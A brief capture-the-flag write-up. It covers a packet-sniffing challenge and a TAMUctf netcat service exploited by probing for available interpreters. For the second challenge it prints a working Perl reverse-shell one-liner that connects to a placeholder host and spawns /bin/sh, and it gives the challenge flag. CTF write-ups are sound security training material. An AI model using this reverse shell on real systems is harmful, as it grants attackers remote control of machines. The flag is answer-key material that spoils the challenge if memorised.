## Difficulty: 
Easy
## Challenge: 
Listen
## Description: 
Just listen
<br>
## Solution:

This challenge was pretty straightforward. We are given a ovpn file and connect to their network. After that I opened up wireshark to listen on the tun0 interface and eventually got a packet which contained the flag.

## Description: 
nc challenges.tamuctf.com 3424
<br>
## Solution:

```console
Execute: whoami
0
Execute: ls
0
Execute: ip addr
127
```
<br>At this point it seems like were just getting the return value as 127 is the unix standard error number for "command not found" so we need to find a command which will let us reverse shell. After trying python, python3, python2, nc, and netcat, I tried perl which just hung instead of sending an error message, so it was waiting for more input. I exited the shell and sent this in a new session
<br>
```perl
perl -e 'use Socket;$i="my_ip";$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec(
"/bin/sh -i");};
```
<br>I popped a reverse shell and ran cat flag.txt to get gigem{r3v3r53_5h3ll5}
